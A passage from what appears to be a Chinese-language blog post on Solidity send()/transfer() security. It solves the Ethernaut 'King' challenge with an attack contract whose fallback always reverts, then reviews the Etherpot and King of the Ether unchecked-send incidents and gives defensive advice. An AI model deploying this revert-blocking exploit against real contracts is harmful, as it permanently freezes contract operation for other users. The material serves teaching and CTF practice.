        if (msg.value = prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
      }
    }
阅读合约代码，我们理解题目为：谁给的钱多谁就能成为 King，并且将前任 King
付的钱归还。而当重新提交实例时，题目会夺回king的地位，所以需要阻止其他人成为king。
回头再看一下代码，当我们成为 King 之后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 transfer()。而我们知道，当
transfer() 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King。
所以我们需要部署一个新的合约，当收到转账时主动抛出错误。
    pragma solidity ^0.4.18;
    contract Attack {
        address instance_address = instance_address_here;
        function Attack() payable{}
        function hack() public {
            instance_address.call.value(1.1 ether)();
        }
        function () public {
            revert();
        }
    }
最后调用 hack()， 成为新的 King。
题目链接为[King](\[https://ethernaut.zeppelin.solutions\]\(https://ethernaut.zeppelin.solutions/)  
)。
### 四、send()函数安全事件
而上述模型均为理论上的存在，那么现实合约中是否有相关安全事件发生呢？
#### 1 Etherpot
第一个事件是Etherpot彩票只能合约。这份合约受到未经检查的 Call 返回值的影响：
    function cash(uint roundIndex, uint subpotIndex){
            var subpotsCount = getSubpotsCount(roundIndex);
            if(subpotIndex>=subpotsCount)
                return;
            var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);
            if(decisionBlockNumber>block.number)
                return;
            if(rounds[roundIndex].isCashed[subpotIndex])
                return;
            //Subpots can only be cashed once. This is to prevent double payouts
            var winner = calculateWinner(roundIndex,subpotIndex);    
            var subpot = getSubpot(roundIndex);
            winner.send(subpot);
            rounds[roundIndex].isCashed[subpotIndex] = true;
            //Mark the round as cashed
    }
其中：
    winner.send(subpot);
    rounds[roundIndex].isCashed[subpotIndex] = true;
    //Mark the round as cashed
怎么样？是不是十分熟悉？这个就是典型的send后并没有检查返回值而直接给复制为ture。从而带来了许多隐患。
#### 2 King of the Ether平台
我们来看一下相关合约平台 [King of the
Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html)。其曾经爆出过相关send函数而引发的漏洞。
King of the Ether合约是一种典型的系统合约账户。我们来看一下它具体的执行步骤：
  * 假设现在想要获得权力需要10个以太币。
  * 假如你想成为国王，所以你支付10个以太币作为交换。
  * 你支付了10个以太币（其中用百分之一的钱做赎金）给上一个权力拥有者。
  * 之后你拥有了国王的权力。
  * 之后新的制度下来，成为国王需要增长费用50%，也就是说需要15个以太币。
  * 下一个人需要支付了15个并成为了新的国王。
然而在这个合约中，上述的send问题也是存在的。
当你准备支付赎金的时候，你的合约中Gas值却不足（少于2300Gas）。所以它不足以执行合约中的代码内容。然而合约失败了，钱并没有转过去，可是系统代码并没有进行验证，也就是说调用send后虽然没给钱，但是仍拿到了东西。
`currentMonarch.etherAddress.send(compensation);`
这也就是我们上面讲述的king这个题目的来源。
而我们对此内容有何建议呢？
首先我们应该避免使用`1.`
.send()``函数，除非我们已经确保执行合约的节点中Gas值充足。
之后我们需要考虑要在遇到send错误后要进行回滚操作，将之前进行的内容返回。
使用`.call.value(value).gas(extraGasAmt)()`函数对主函数进行支付。
检查啊`send()`与`call()`函数的返回结果。并针对不同合约的特点指定不同的规则，比如像 the King of the
Ether，它会在执行代码时消耗大量的Gas，这会时合约僵持在哪里，所以导致合约平台卡死，没有任何人能够继续申请。
最重要的一点，在合约部署之前，多进行测试工作。
### 五、参考链接
  * 1 
  * 2 
  * 3 
  * 4 
  * 5 
**本稿为原创稿件，转载请标明出处。谢谢。**